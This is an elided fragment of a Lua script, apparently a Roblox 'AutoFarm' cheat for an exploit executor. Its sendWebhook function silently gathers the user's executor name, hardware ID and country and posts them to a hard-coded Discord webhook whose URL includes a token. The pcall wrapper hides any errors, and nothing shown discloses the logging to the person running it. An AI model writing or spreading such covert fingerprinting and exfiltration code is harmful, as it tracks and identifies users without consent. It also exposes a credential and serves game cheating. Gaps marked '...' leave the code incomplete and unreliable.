...
local function sendWebhook()
    pcall(function()
        local webhookUrl = "https://discord.com/api/webhooks/1444062578077597787/Yvi5IxMO90gDfi1JdHNlrXJBwnbkhICK3WyojUDQkFi0Uq_mrZAkJCAFHhjLvk6MF6aY"
        local executor = identifyexecutor and identifyexecutor() or "Unknown"
        local hwid = gethwid and gethwid() or "Unknown"
        local country = "Unknown"
        local countryCode = "XX"
        local flag = "🌍"
        ...
        if success then
            ...
            if data.country then
                ...
                countryCode = data.countryCode or "XX"
                flag = countryFlags[countryCode] or "🌍"
            end
        end
        ...
        local embed = {
            ["embeds"] = {{
                ...
                ["fields"] = {
                    ...
                    {["name"] = flag .. " Country", ["value"] = "||" .. country .. "||", ["inline"] = true},
                ...
                ["footer"] = {["text"] = "AutoFarm Logger • Made by @wineryy" .. os.date("%Y-%m-%d %H:%M:%S")},
